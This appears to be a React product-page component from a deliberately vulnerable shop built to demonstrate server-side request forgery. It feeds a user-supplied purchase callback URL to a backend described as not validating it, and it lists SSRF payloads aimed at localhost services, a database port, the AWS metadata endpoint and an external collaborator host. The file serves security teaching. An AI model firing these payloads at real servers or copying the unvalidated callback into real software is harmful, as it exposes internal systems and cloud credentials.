import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { productServiceAPI, inventoryServiceAPI } from '../services/api';

function ProductDetail() {
  const { id } = useParams();
  const [product, setProduct] = useState(null);
  const [selectedSize, setSelectedSize] = useState('');
  const [quantity, setQuantity] = useState(null);
  const [loading, setLoading] = useState(true);
  const [ssrfUrl, setSsrfUrl] = useState('');
  const [purchaseCallback, setPurchaseCallback] = useState('');

  useEffect(() => {
    loadProduct();
  }, [id]);

  const loadProduct = async () => {
    try {
      const response = await productServiceAPI.getProductById(id);
      setProduct(response.data);
      if (response.data.sizes && response.data.sizes.length > 0) {
        setSelectedSize(response.data.sizes[0].size);
      }
    } catch (error) {
      console.error('Error loading product:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleSizeChange = async (size) => {
    setSelectedSize(size);
    setQuantity(null);
    
    // Call inventory service to get quantity
    try {
      const response = await inventoryServiceAPI.getInventory(id, size);
      setQuantity(response.data.quantity);
    } catch (error) {
      console.error('Error getting inventory:', error);
      setQuantity(0);
    }
  };

  // SSRF Attack 1: Purchase with malicious callback
  const handlePurchase = async () => {
    if (!selectedSize) {
      alert('Please select a size');
      return;
    }

    try {
      const purchaseData = {
        product_id: id,
        size: selectedSize,
        quantity: 1
      };

      // SSRF: Add callback URL if provided
      if (purchaseCallback) {
        purchaseData.callback_url = purchaseCallback;
      }

      const response = await inventoryServiceAPI.purchase(purchaseData);
      alert(`Purchase successful! New quantity: ${response.data.new_quantity}`);
      setQuantity(response.data.new_quantity);
    } catch (error) {
      console.error('Purchase error:', error);
      alert('Purchase failed');
    }
  };

  const exploitSSRFPurchase = () => {
    // Demo SSRF payloads for purchase callback
    const payloads = [
      'http://localhost:8081/api/users/1',           // Internal user service
      'http://localhost:8082/admin/products/',       // Internal admin panel
      'http://localhost:5433',                       // PostgreSQL user DB
      'http://169.254.169.254/latest/meta-data/',    // AWS metadata
      'http://192.168.1.1:8080/admin',               // Internal network
      'http://burp-collaborator.example.com'         // External callback
    ];
    
    const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
    setPurchaseCallback(randomPayload);
  };

  if (loading) {
    return <div>Loading product...</div>;
  }

  if (!product) {
    return <div>Product not found</div>;
  }

  return (
    <div className="product-detail">
      <img 
        src={product.image_url || 'https://via.placeholder.com/800x400?text=No+Image'} 
        alt={product.name} 
      />
      <h2>{product.name}</h2>
      <p>{product.description}</p>
      <p className="price">${product.price}</p>

      {product.sizes && product.sizes.length > 0 && (
        <div className="size-selector">
          <h3>Select Size:</h3>
          <div className="size-buttons">
            {product.sizes.map((sizeObj) => (
              <button
                key={sizeObj.size}
                className={`size-btn ${selectedSize === sizeObj.size ? 'active' : ''}`}
                onClick={() => handleSizeChange(sizeObj.size)}
              >
                {sizeObj.size}
              </button>
            ))}
          </div>
          
          {quantity !== null && (
            <div className="quantity-info">
              <strong>Available Quantity:</strong> {quantity} items
              {quantity === 0 && <p style={{ color: 'red' }}>Out of stock</p>}
            </div>
          )}
        </div>
      )}

      {/* SSRF Demo: Purchase with Callback */}
      <div className="ssrf-demo">
        <h4>🔓 SSRF Demo: Purchase with Callback</h4>
        <p>
          <strong>Realistic Scenario:</strong> Sau khi mua hàng, inventory service gửi callback 
          để thông báo cho payment gateway hoặc warehouse system.
        </p>
        
        <button onClick={exploitSSRFPurchase} className="btn btn-warning">
          Generate Random SSRF Payload
        </button>

        <div className="form-group">
          <label>🎯 Payment Callback URL (SSRF):</label>
          <input
            type="text"
            value={purchaseCallback}
            onChange={(e) => setPurchaseCallback(e.target.value)}
            placeholder="http://payment-gateway.internal/webhook"
          />
          <small>⚠️ Server sẽ gửi GET request đến URL này sau khi trừ kho</small>
        </div>

        <button 
          onClick={handlePurchase} 
          className="btn btn-primary"
          disabled={quantity === 0}
        >
          {purchaseCallback ? '🎯 Purchase (with SSRF)' : 'Purchase'}
        </button>
        
        <div style={{ marginTop: '1rem', fontSize: '0.9rem', background: '#fff3cd', padding: '1rem', borderRadius: '4px' }}>
          <p><strong>Example SSRF Targets:</strong></p>
          <ul style={{ margin: '0.5rem 0', paddingLeft: '1.5rem' }}>
            <li><code>http://localhost:8081/api/users</code> - Internal user service</li>
            <li><code>http://localhost:5433</code> - PostgreSQL database</li>
            <li><code>http://169.254.169.254/latest/meta-data/</code> - Cloud metadata</li>
          </ul>
          <p style={{ color: '#856404', marginTop: '0.5rem' }}>
            ⚠️ Inventory service sẽ thực hiện request mà không validate URL!
          </p>
        </div>
      </div>
    </div>
  );
}

export default ProductDetail;
